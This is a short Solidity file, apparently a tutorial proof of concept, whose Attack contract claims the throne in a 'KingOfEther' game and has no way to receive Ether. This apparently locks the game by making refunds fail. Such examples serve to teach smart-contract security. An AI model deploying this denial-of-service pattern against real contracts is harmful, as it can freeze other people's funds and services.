pragma solidity ^0.8.10;

import "./king.sol";


contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }
    function attack() public payable {
        kingOfEther.becomeKing{value: msg.value}();
    }
}